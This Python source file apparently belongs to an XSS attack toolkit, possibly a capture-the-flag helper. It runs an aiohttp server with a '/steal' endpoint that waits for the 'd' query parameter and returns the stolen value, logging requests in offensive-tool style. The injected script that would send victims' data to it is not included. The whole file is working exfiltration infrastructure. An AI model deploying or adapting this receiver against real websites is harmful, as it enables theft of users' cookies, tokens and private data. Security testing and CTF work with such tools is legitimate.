import asyncio
from typing import Awaitable, Callable, Optional

from aiohttp import web

__all__ = [
    "xss_get_secret_data",
    "HandlerType",
]

type HandlerType[T] = Callable[
    [web.BaseRequest, asyncio.Queue[T]], Awaitable[web.StreamResponse]
]


async def _handler(
    request: web.BaseRequest, data_queue: asyncio.Queue[str]
) -> web.StreamResponse:
    params = request.rel_url.query
    data = params.get("d", None)
    if data is not None:
        await data_queue.put(data)
    return web.Response(text="OK")


async def xss_get_secret_data[T](
    handler: HandlerType[T],
    port: int = 8080,
    timeout: int = 60,
    method: str = "GET",
    path: str = "/steal",
) -> Optional[T]:
    """
    Run a simple HTTP server that listens for GET requests on /steal endpoint
    and store the 'd' query parameter. The server exits after receiving data
    or after the timeout.

    :param port: Port to listen on (default: 8080)
    :type port: int
    :param timeout: Timeout in seconds before the server stops (default: 60)
    :type timeout: int
    """

    data_queue: asyncio.Queue[T] = (
        asyncio.Queue()
    )  # Single pipe for data and signaling

    async def callback(request: web.BaseRequest) -> web.StreamResponse:
        print(
            f"[*] Request received: '{request.method} {request.path}' from {request.remote}"
        )
        if request.method == method and request.path == path:
            return await handler(request, data_queue)
        return web.Response(text="OK")

    try:
        server = web.Server(callback)
        runner = web.ServerRunner(server)
        await runner.setup()
        site = web.TCPSite(runner, port=port)
        await site.start()
        print(f"[+] HTTP server running on port {port}")

        # Wait for either data to be received OR timeout
        secret_data = await asyncio.wait_for(data_queue.get(), timeout=timeout)
        print(f"[+] Data received before timeout")
        return secret_data
    except asyncio.TimeoutError:
        print(f"[*] Timeout after {timeout}s, shutting down")
    except asyncio.CancelledError:
        print("[-] Cancelled")
    except KeyboardInterrupt:
        print("[-] Interrupted by user")
    finally:
        await runner.cleanup()
        await server.shutdown()
    return None


if __name__ == "__main__":
    asyncio.run(xss_get_secret_data(_handler))
